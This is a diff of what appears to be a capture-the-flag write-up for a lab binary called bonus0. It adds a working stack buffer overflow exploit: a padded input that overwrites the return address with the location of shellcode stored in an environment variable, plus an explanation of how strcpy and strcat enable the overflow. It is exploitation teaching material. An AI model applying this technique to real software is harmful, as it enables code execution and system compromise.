@@ -10,10 +10,10 @@ AAAAAAAAAAAAAAAAAAA
 0xbffff77d
 \x7d\xf7\xff\xbf
 
-Starting program: /home/user/bonus0/bonus0 
- - 
+Starting program: /home/user/bonus0/bonus0
+ -
 AAAAAAAAAAAAAAAAAAAA
- - 
+ -
 123456789ABCDEFGHIJK
 AAAAAAAAAAAAAAAAAAAA123456789ABCDEFGHIJK��� 123456789ABCDEFGHIJK���
 
@@ -24,7 +24,17 @@ Program received signal SIGSEGV, Segmentation fault.
 //So we have to change this section of our string by the address of our new EGG env variable
 
 AAAAAAAAAAAAAAAAAAAA
- - 
+ -
 123456789\x7d\xf7\xff\xbfEFGHIJK
 
-(echo "AAAAAAAAAAAAAAAAAAAA" ; python -c "print '123456789\x7d\xf7\xff\xbfEFGHIJK'"; cat ) | ./bonus0 
+//we just put it in the stdin of the program and let it open :
+(echo "AAAAAAAAAAAAAAAAAAAA" ; python -c "print '123456789\x7d\xf7\xff\xbfEFGHIJK'"; cat ) | ./bonus0
+
+#How does it works?
+We have a buffer of 54 caracters as a parameter of pp
+=> if we overflow it we will go to the eip address and so we can open a bash.
+For this we use the fact that strcpy doesn't put a \0 if we doesn't have the space and that strcat and copy at the end of the last string
+
+if the first one is 20car, so the first strcpy in pp will write str1 + str2 => 40car
+then we had the space and the second char and we are at 54 car at a moment in our second string,
+we just have to find where in our string and replace it by the address where is our shell code
